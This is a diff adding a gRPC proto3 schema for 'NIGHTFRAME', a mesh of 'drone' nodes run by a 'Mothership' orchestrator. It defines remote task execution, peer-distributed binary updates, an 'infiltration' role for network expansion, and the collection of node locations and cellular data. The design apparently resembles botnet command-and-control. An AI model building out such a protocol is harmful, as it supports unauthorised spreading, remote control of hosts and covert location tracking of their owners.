@@ -1,0 +1,418 @@
+syntax = "proto3";
+
+option csharp_namespace = "NIGHTFRAME.Orchestrator.Grpc";
+
+package nightframe;
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//                          NIGHTFRAME MESH PROTOCOL v2.0
+// ═══════════════════════════════════════════════════════════════════════════════
+// Updated: December 2024
+// Changes: Added Cellular Intelligence, Neural Compute Capabilities, Location
+
+// The Mothership (Orchestrator) Service
+service NightframeOrchestrator {
+  // Bidirectional stream for drone connection
+  rpc Connect (stream DroneMessage) returns (stream MothershipCommand);
+  
+  // One-shot registration handshake
+  rpc Register (DroneManifest) returns (RegistrationResponse);
+  
+  // Request a compute shard
+  rpc RequestShard (ShardRequest) returns (ComputeShard);
+  
+  // Submit compute result
+  rpc SubmitResult (ShardResult) returns (ResultAck);
+  
+  // Request the latest binary for updates
+  rpc RequestUpdate (UpdateRequest) returns (stream BinaryChunk);
+  
+  // Report peer discovery for P2P coordination
+  rpc ReportPeer (PeerInfo) returns (Empty);
+  
+  // NEW: Request cell tower database sync
+  rpc SyncCellDatabase (CellDatabaseRequest) returns (stream CellTowerRecord);
+  
+  // NEW: Report cellular measurements for crowd-sourced data
+  rpc ReportCellMeasurement (CellMeasurementReport) returns (Empty);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//                               MESSAGE TYPES
+// ═══════════════════════════════════════════════════════════════════════════════
+
+message Empty {}
+
+// Drone capabilities and identity
+message DroneManifest {
+  string node_id = 1;
+  string binary_version = 2;
+  HardwareSpecs specs = 3;
+  repeated string cached_models = 4;
+  bytes public_key = 5;                  // Ed25519 public key for identity
+  int64 uptime_seconds = 6;
+  CellularCapabilities cellular = 7;     // NEW: Cellular intelligence capabilities
+  NeuralCapabilities neural = 8;         // NEW: Neural compute capabilities
+  LocationInfo location = 9;             // NEW: Current location (GPS or RF-predicted)
+}
+
+message HardwareSpecs {
+  int64 ram_mb = 1;
+  int32 cpu_cores = 2;
+  int64 disk_free_mb = 3;
+  bool has_gpu = 4;
+  string gpu_name = 5;
+  int64 gpu_vram_mb = 6;
+  double current_cpu_load = 7;
+  int64 estimated_flops = 8;             // NEW: Estimated compute capacity
+  string execution_provider = 9;         // NEW: ONNX execution provider (CPU, CUDA, DirectML)
+}
+
+// NEW: Cellular network capabilities
+message CellularCapabilities {
+  bool available = 1;                    // Whether cellular modem is present
+  int64 serving_cell_id = 2;             // Current serving cell ID
+  float rsrp = 3;                        // Reference Signal Received Power (dBm)
+  float rsrq = 4;                        // Reference Signal Received Quality (dB)
+  float sinr = 5;                        // Signal to Interference + Noise Ratio (dB)
+  int32 neighbor_cell_count = 6;         // Number of visible neighbor cells
+  string radio_type = 7;                 // GSM, UMTS, LTE, NR
+  string carrier_name = 8;               // Carrier name if available
+  bool rf_location_available = 9;        // Whether RF fingerprint location is available
+  bool handover_prediction_available = 10; // Whether handover prediction is active
+  int32 mcc = 11;                        // Mobile Country Code
+  int32 mnc = 12;                        // Mobile Network Code
+}
+
+// NEW: Neural network compute capabilities
+message NeuralCapabilities {
+  bool onnx_available = 1;               // Whether ONNX Runtime is available
+  repeated string execution_providers = 2; // Available providers (CPU, CUDA, DirectML, etc.)
+  int64 max_model_size_mb = 3;           // Maximum model size this node can load
+  repeated string loaded_models = 4;     // Currently loaded model hashes
+  int32 max_batch_size = 5;              // Maximum batch size for inference
+  float inference_latency_ms = 6;        // Average inference latency
+}
+
+// NEW: Location information (GPS or RF-predicted)
+message LocationInfo {
+  double latitude = 1;
+  double longitude = 2;
+  float accuracy_meters = 3;             // Uncertainty radius
+  float confidence = 4;                  // 0-1 confidence score
+  LocationSource source = 5;
+  int64 timestamp_unix = 6;
+}
+
+enum LocationSource {
+  LOCATION_UNKNOWN = 0;
+  LOCATION_GPS = 1;
+  LOCATION_RF_FINGERPRINT = 2;
+  LOCATION_WIFI = 3;
+  LOCATION_IP_GEOLOCATION = 4;
+  LOCATION_MANUAL = 5;
+}
+
+message RegistrationResponse {
+  bool accepted = 1;
+  NodeRole assigned_role = 2;
+  string reason = 3;
+  GlobalState global_state = 4;
+  CellDatabaseInfo cell_database_info = 5; // NEW: Cell database sync info
+}
+
+enum NodeRole {
+  ROLE_UNKNOWN = 0;
+  ROLE_COMPUTE = 1;      // Heavy processing, GPU/RAM rich
+  ROLE_STORAGE = 2;      // Large disk space
+  ROLE_RELAY = 3;        // Low specs, just route traffic
+  ROLE_GENERAL = 4;      // Balanced capabilities
+  ROLE_INFILTRATION = 5; // Network expansion specialist
+  ROLE_SCOUT = 6;        // NEW: Mobile reconnaissance (cellular-enabled)
+}
+
+message GlobalState {
+  string latest_version = 1;
+  bytes latest_binary_hash = 2;
+  string current_model_hash = 3;
+  int64 active_node_count = 4;
+  int64 total_compute_ops = 5;
+  int64 total_cell_measurements = 6;     // NEW: Total cellular measurements in DB
+  int32 geographic_regions_covered = 7;  // NEW: Number of regions with coverage
+}
+
+// NEW: Cell database sync info
+message CellDatabaseInfo {
+  int64 total_records = 1;
+  int64 last_updated_unix = 2;
+  string database_version = 3;
+}
+
+// Messages flowing from drone to mothership
+message DroneMessage {
+  oneof payload {
+    Heartbeat heartbeat = 1;
+    TaskStatus task_status = 2;
+    PeerDiscovery peer_discovery = 3;
+    LogEntry log_entry = 4;
+    CellularStatusUpdate cellular_update = 5;    // NEW: Cellular status updates
+    LocationUpdate location_update = 6;          // NEW: Location updates
+  }
+}
+
+message Heartbeat {
+  string node_id = 1;
+  double cpu_load = 2;
+  int64 ram_used_mb = 3;
+  int64 timestamp_unix = 4;
+  CellularCapabilities cellular = 5;     // NEW: Include cellular status
+  LocationInfo location = 6;             // NEW: Include location
+}
+
+// NEW: Real-time cellular status update
+message CellularStatusUpdate {
+  string node_id = 1;
+  int64 serving_cell_id = 2;
+  float rsrp = 3;
+  float rsrq = 4;
+  float sinr = 5;
+  repeated NeighborCellInfo neighbors = 6;
+  bool handover_imminent = 7;
+  int64 recommended_cell_id = 8;
+  float time_to_handover_ms = 9;
+}
+
+// NEW: Neighbor cell information
+message NeighborCellInfo {
+  int64 cell_id = 1;
+  int32 physical_cell_id = 2;
+  float rsrp = 3;
+  float rsrq = 4;
+  int32 earfcn = 5;
+}
+
+// NEW: Location update from drone
+message LocationUpdate {
+  string node_id = 1;
+  LocationInfo location = 2;
+}
+
+message TaskStatus {
+  string task_id = 1;
+  TaskState state = 2;
+  float progress = 3;
+  string result_hash = 4;
+}
+
+enum TaskState {
+  TASK_PENDING = 0;
+  TASK_RUNNING = 1;
+  TASK_COMPLETED = 2;
+  TASK_FAILED = 3;
+}
+
+message PeerDiscovery {
+  string discovered_node_id = 1;
+  string discovered_address = 2;
+  NodeRole discovered_role = 3;
+  CellularCapabilities discovered_cellular = 4; // NEW: Include cellular info of peer
+}
+
+message LogEntry {
+  string node_id = 1;
+  int64 timestamp_unix = 2;
+  string level = 3;
+  string message = 4;
+}
+
+// Commands flowing from mothership to drones
+message MothershipCommand {
+  oneof payload {
+    ExecuteTask execute = 1;
+    UpdateCommand update = 2;
+    HydrateCommand hydrate = 3;
+    RoleChange role_change = 4;
+    PeerIntroduction peer_intro = 5;
+    TerminateCommand terminate = 6;
+    CellularCommand cellular_cmd = 7;     // NEW: Cellular control commands
+    LocationRequest location_req = 8;     // NEW: Request location update
+  }
+}
+
+message ExecuteTask {
+  string task_id = 1;
+  string task_type = 2;
+  bytes task_payload = 3;
+  int32 priority = 4;
+  int64 deadline_unix = 5;
+  NeuralTaskHint neural_hint = 6;        // NEW: Hints for neural compute tasks
+}
+
+// NEW: Hints for optimizing neural compute tasks
+message NeuralTaskHint {
+  bool prefer_gpu = 1;
+  int32 max_batch_size = 2;
+  int32 max_latency_ms = 3;
+  string preferred_execution_provider = 4;
+}
+
+message UpdateCommand {
+  string new_version = 1;
+  string peer_with_binary = 2;  // Download from this peer, not mothership
+  bytes expected_hash = 3;
+}
+
+message HydrateCommand {
+  string model_hash = 1;
+  string storage_peer = 2;
+  int32 shard_start_layer = 3;
+  int32 shard_end_layer = 4;
+}
+
+message RoleChange {
+  NodeRole new_role = 1;
+  string reason = 2;
+}
+
+message PeerIntroduction {
+  string peer_node_id = 1;
+  string peer_address = 2;
+  NodeRole peer_role = 3;
+  CellularCapabilities peer_cellular = 4; // NEW: Include peer cellular info
+}
+
+message TerminateCommand {
+  string reason = 1;
+  bool perform_cleanup = 2;
+}
+
+// NEW: Cellular control commands
+message CellularCommand {
+  oneof action {
+    ForceHandover force_handover = 1;
+    StartDriveTest start_drive_test = 2;
+    StopDriveTest stop_drive_test = 3;
+    SyncCellDatabase sync_database = 4;
+  }
+}
+
+message ForceHandover {
+  int64 target_cell_id = 1;
+  int32 mcc = 2;
+  int32 mnc = 3;
+}
+
+message StartDriveTest {
+  int32 duration_seconds = 1;
+  int32 sample_interval_ms = 2;
+}
+
+message StopDriveTest {}
+
+message SyncCellDatabase {
+  string database_version = 1;
+}
+
+// NEW: Request location from drone
+message LocationRequest {
+  bool high_accuracy = 1;
+  int32 timeout_seconds = 2;
+}
+
+// Compute shard for distributed inference
+message ShardRequest {
+  string node_id = 1;
+  string preferred_model = 2;
+  NeuralCapabilities node_capabilities = 3; // NEW: Include neural capabilities
+}
+
+message ComputeShard {
+  string shard_id = 1;
+  string model_hash = 2;
+  int32 start_layer = 3;
+  int32 end_layer = 4;
+  bytes input_data = 5;
+  string next_hop_address = 6;  // Where to send output
+  NeuralTaskHint hints = 7;     // NEW: Optimization hints
+}
+
+message ShardResult {
+  string shard_id = 1;
+  string node_id = 2;
+  bytes output_data = 3;
+  int64 compute_time_ms = 4;
+  bytes result_signature = 5;  // Ed25519 signature for verification
+  string execution_provider = 6;         // NEW: Which provider was used
+  int32 memory_used_mb = 7;              // NEW: Memory consumed
+}
+
+message ResultAck {
+  bool accepted = 1;
+  int64 credits_earned = 2;
+  string rejection_reason = 3;
+}
+
+// Binary update streaming
+message UpdateRequest {
+  string node_id = 1;
+  string current_version = 2;
+  string target_platform = 3;  // "win-x64", "linux-x64", etc.
+}
+
+message BinaryChunk {
+  int32 chunk_index = 1;
+  int32 total_chunks = 2;
+  bytes data = 3;
+  bytes chunk_hash = 4;
+}
+
+message PeerInfo {
+  string from_node_id = 1;
+  string peer_address = 2;
+  string peer_node_id = 3;
+  bytes peer_public_key = 4;
+  CellularCapabilities peer_cellular = 5; // NEW: Include peer cellular info
+  LocationInfo peer_location = 6;         // NEW: Include peer location
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//                          CELLULAR DATABASE SYNC
+// ═══════════════════════════════════════════════════════════════════════════════
+
+// NEW: Request to sync cell tower database
+message CellDatabaseRequest {
+  string node_id = 1;
+  string current_database_version = 2;
+  LocationInfo location = 3;             // Request cells near this location
+  float radius_km = 4;                   // Radius to fetch
+}
+
+// NEW: Cell tower record for database sync
+message CellTowerRecord {
+  int64 cell_id = 1;
+  int32 mcc = 2;
+  int32 mnc = 3;
+  int32 lac = 4;
+  double latitude = 5;
+  double longitude = 6;
+  float range_meters = 7;
+  int32 samples = 8;
+  string radio_type = 9;
+  int64 last_updated_unix = 10;
+}
+
+// NEW: Report cellular measurement for crowd-sourced data collection
+message CellMeasurementReport {
+  string node_id = 1;
+  int64 cell_id = 2;
+  int32 mcc = 3;
+  int32 mnc = 4;
+  int32 lac = 5;
+  float rsrp = 6;
+  float rsrq = 7;
+  float sinr = 8;
+  float timing_advance = 9;
+  LocationInfo ground_truth_location = 10; // GPS location at measurement time
+  int64 timestamp_unix = 11;
+  string radio_type = 12;
+}
